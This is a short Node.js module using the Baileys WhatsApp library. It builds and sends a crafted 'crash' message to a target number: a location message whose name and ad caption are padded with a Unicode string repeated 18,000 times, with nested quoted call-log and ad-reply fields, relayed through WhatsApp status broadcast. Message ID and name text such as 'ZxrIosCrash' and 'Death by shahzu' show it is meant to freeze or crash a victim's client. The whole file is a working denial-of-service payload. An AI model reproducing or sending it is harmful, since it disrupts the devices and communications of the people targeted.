
const { default: makeSYxS7, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto')

async function test(SYxS7, target, ptcp = true) {
  try {
    const payload = {
      locationMessage: {
        degreesLatitude: 9.99,
        degreesLongitude: -9.99,
        name: "Death by shahzu" + "⵿⿻⵿⿻".repeat(18000),
        url: "https://t.me/xeotmzzz",
        contextInfo: {
          stanzaId: "FEDCBA9876543210",
          participant: "1@s.whatsapp.net",
          quotedMessage: {
            callLogMessage: {
              isVideo: true,
              callOutcome: "2",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [
                {
                  jid: "1@s.whatsapp.net",
                  callOutcome: "2"
                }
              ]
            }
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: "iphone lu ampas",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZAQABAAD/",
              caption: "⵿⿻⵿⿻".repeat(18000)
            },
            placeholderKey: {
              remoteJid: "1s.whatsapp.net",
              fromMe: false,
              id: "ZxrIosCrash"
            }
          }
        }
      }
    };

    await SYxS7.relayMessage("status@broadcast", payload, {
      messageId: payload.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target }
                }
              ]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("❌ Error:", err.message);
  }
}


module.exports = { test };
